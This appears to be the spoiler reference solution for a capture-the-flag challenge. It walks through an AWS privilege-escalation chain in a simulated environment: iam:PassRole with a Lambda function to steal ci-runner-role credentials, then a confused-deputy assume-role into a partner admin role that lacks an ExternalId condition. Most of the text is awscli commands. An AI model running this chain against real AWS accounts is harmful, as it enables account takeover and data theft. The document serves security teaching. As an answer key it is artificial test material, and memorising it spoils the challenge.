# Deputy — Reference Solution (spoiler)

A self-contained simulated AWS (IAM/STS/Lambda/S3) driven by real `awscli --endpoint-url`. The chain
is a classic Lambda+PassRole privesc into an over-trusting cross-account role (the confused deputy),
then a correctly-hardened role gated by `sts:ExternalId`.

```sh
EP="--endpoint-url http://<host>:<port>"
export AWS_DEFAULT_REGION=us-east-1
aws configure set default.s3.addressing_style path        # path-style S3 against the endpoint
export AWS_ACCESS_KEY_ID=AKIAANALYST0000000000
export AWS_SECRET_ACCESS_KEY=wJalrAnalystSecretKeyEXAMPLEbPxRfiCY
```

## Stage 1 — recon → FLAG1
```sh
aws $EP sts get-caller-identity                # user/analyst
aws $EP s3 ls / ; aws $EP s3api get-object --bucket deputy-analyst-scratch --key welcome.txt /dev/stdout
aws $EP iam list-attached-user-policies --user-name analyst
```
You can `iam:Get*/List*`, `lambda:CreateFunction/InvokeFunction`, and `iam:PassRole` — but only on
`ci-runner-role`. Note the CI runs a Lambda that assumes `ci-runner-role`.

## Stage 2 — PassRole + Lambda → steal ci-runner-role → FLAG2
`ci-runner-role` is more privileged than you; you may pass it to a function. Create a function AS that
role and invoke it — the function hands back its execution role's credentials:
```sh
aws $EP lambda create-function --function-name pwn --runtime python3.12 \
    --role arn:aws:iam::111111111111:role/ci-runner-role --handler h --zip-file fileb://f.zip
aws $EP lambda invoke --function-name pwn out.json ; cat out.json    # -> AWS_* creds for ci-runner-role
# export those creds, then:
aws $EP s3api get-object --bucket deputy-runner-logs --key build.log /dev/stdout   # FLAG2
```
(You cannot pass `partner-admin-role` — `iam:PassRole` is scoped to `ci-runner-role` only.)

## Stage 3 — the confused deputy → admin → FLAG3
`ci-runner-role` may `sts:AssumeRole` `partner-admin-role`, whose **trust policy trusts the whole
account root with NO `ExternalId` condition** — the confused-deputy misconfiguration.
```sh
aws $EP sts assume-role --role-arn arn:aws:iam::111111111111:role/partner-admin-role \
    --role-session-name s   # -> admin creds
aws $EP s3api get-object --bucket deputy-flag-vault --key flag /dev/stdout            # FLAG3
aws $EP s3api get-object --bucket deputy-flag-vault --key partner-config.json /dev/stdout   # leaks ExternalId
```

## Stage 4 — the hardened role, done right → FLAG4
`partner-secure-role` trusts the account root too, but **requires the correct `sts:ExternalId`**
(the near-miss: assuming it without / with a wrong id is denied). Use the leaked id:
```sh
aws $EP sts assume-role --role-arn arn:aws:iam::111111111111:role/partner-secure-role \
    --role-session-name s --external-id Dc-2026-8f31a97c4b2e
aws $EP s3api get-object --bucket deputy-crown-vault --key flag /dev/stdout           # FLAG4
```

## Why the gates are real (anti-cheese, all verified)
- analyst can't `sts:AssumeRole partner-admin-role` directly (no such permission) → must go via the runner.
- analyst can't `iam:PassRole partner-admin-role` into a Lambda (PassRole scoped to `ci-runner-role`).
- analyst can't read `deputy-flag-vault` / `deputy-crown-vault` directly (no `s3:GetObject`).
- `partner-secure-role` rejects AssumeRole without the exact `sts:ExternalId` (teaches the correct control).
